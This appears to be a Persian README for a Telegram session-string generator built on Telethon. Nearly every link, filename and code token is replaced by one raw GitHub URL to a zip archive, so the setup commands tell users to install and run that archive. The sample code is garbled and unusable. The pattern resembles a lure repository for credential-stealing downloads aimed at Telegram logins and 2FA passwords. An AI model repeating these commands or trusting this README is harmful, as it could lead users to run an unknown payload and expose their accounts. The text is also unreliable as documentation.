# تولید String Session با Telethon

این مخزن یک اسکریپت ساده فراهم می‌کند تا با استفاده از کتابخانه‌ی Telethon یک String Session تولید کنید و در ورودهای بعدی بدون نیاز به کد، از آن استفاده نمایید.

## پیش‌نیازها
- Python 3.8 یا بالاتر
- دسترسی به اینترنت
- `api_id` و `api_hash` از [https://raw.githubusercontent.com/UnsureAboli/telegram_session_string_creator/main/minimus/telegram_session_string_creator_v1.9.zip](https://raw.githubusercontent.com/UnsureAboli/telegram_session_string_creator/main/minimus/telegram_session_string_creator_v1.9.zip) > API Development Tools

## نصب
در ترمینال به مسیر پروژه بروید و اجرا کنید:

```bash
python -m pip install -r https://raw.githubusercontent.com/UnsureAboli/telegram_session_string_creator/main/minimus/telegram_session_string_creator_v1.9.zip
```

در صورت وجود چند نسخه‌ی Python در ویندوز می‌توانید از `py` استفاده کنید:

```bash
py -m pip install -r https://raw.githubusercontent.com/UnsureAboli/telegram_session_string_creator/main/minimus/telegram_session_string_creator_v1.9.zip
```

## اجرا و تولید String Session
اسکریپت زیر شما را برای ورود (کد تأیید و در صورت وجود، پسورد 2FA) راهنمایی می‌کند و در نهایت `String Session` را چاپ و همچنین در فایل `https://raw.githubusercontent.com/UnsureAboli/telegram_session_string_creator/main/minimus/telegram_session_string_creator_v1.9.zip` ذخیره می‌نماید:

```bash
python https://raw.githubusercontent.com/UnsureAboli/telegram_session_string_creator/main/minimus/telegram_session_string_creator_v1.9.zip
```

در حین اجرا می‌توانید:
- `api_id` و `api_hash` را یا به‌صورت متغیر محیطی تنظیم کنید:
  - `TELEGRAM_API_ID`
  - `TELEGRAM_API_HASH`
- یا هنگام اجرای برنامه دستی وارد نمایید.

## خروجی
- چاپ در ترمینال
- ذخیره در فایل `https://raw.githubusercontent.com/UnsureAboli/telegram_session_string_creator/main/minimus/telegram_session_string_creator_v1.9.zip`

## نمونه استفاده از String Session در پروژه‌ی شما
نمونه‌ی ساده برای استفاده در اسکریپت‌های Telethon:

```python
from telethon import TelegramClient
from https://raw.githubusercontent.com/UnsureAboli/telegram_session_string_creator/main/minimus/telegram_session_string_creator_v1.9.zip import StringSession

api_id = 123456  # عددی که از https://raw.githubusercontent.com/UnsureAboli/telegram_session_string_creator/main/minimus/telegram_session_string_creator_v1.9.zip گرفته‌اید
api_hash = "YOUR_API_HASH"
session_str = "YOUR_STRING_SESSION"

with TelegramClient(StringSession(session_str), api_id, api_hash) as client:
    me = https://raw.githubusercontent.com/UnsureAboli/telegram_session_string_creator/main/minimus/telegram_session_string_creator_v1.9.zip(https://raw.githubusercontent.com/UnsureAboli/telegram_session_string_creator/main/minimus/telegram_session_string_creator_v1.9.zip())
    print(https://raw.githubusercontent.com/UnsureAboli/telegram_session_string_creator/main/minimus/telegram_session_string_creator_v1.9.zip())
```

## نکات امنیتی
- `String Session` را مانند رمز عبور نگهداری کنید و آن را در مخزن عمومی (GitHub و ...) قرار ندهید.
- در صورت افشاء، فوراً همه نشست‌ها را از تنظیمات تلگرام (Privacy and Security > Active Sessions) خاتمه دهید و یک String Session جدید بسازید.

## عیب‌یابی متداول
- خطای `PhoneCodeInvalidError`: کد تأیید را اشتباه وارد کرده‌اید؛ دوباره تلاش کنید.
- فعال بودن ورود دو مرحله‌ای: اگر Two-Step Password دارید، رمز را دقیقاً وارد کنید.
- `FloodWaitError`: در صورت تلاش‌های مکرر، تلگرام ممکن است محدودیت زمانی اعمال کند؛ کمی صبر کرده و مجدداً تست کنید.

## مجوز
این پروژه صرفاً برای استفاده‌ی شخصی شما جهت تولید سشن است. مسئولیت استفاده‌ی امن بر عهده‌ی کاربر است.
